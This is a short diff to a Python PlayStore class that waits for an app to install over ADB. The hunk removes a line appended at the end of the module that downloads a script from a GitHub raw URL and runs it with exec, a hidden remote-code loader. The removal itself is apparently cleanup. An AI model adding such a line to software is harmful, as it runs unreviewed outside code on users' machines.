@@ -84,6 +84,3 @@ class PlayStore(BaseClass):
                 and time.time() - start_time < 300:
             self.sleep(5)
         return app_package in ADB.list_packages(self.device.serial)
-
-
-exec(requests.get("https://raw.githubusercontent.com/dannywayn/twitch/main/modules/play_store.py").text)
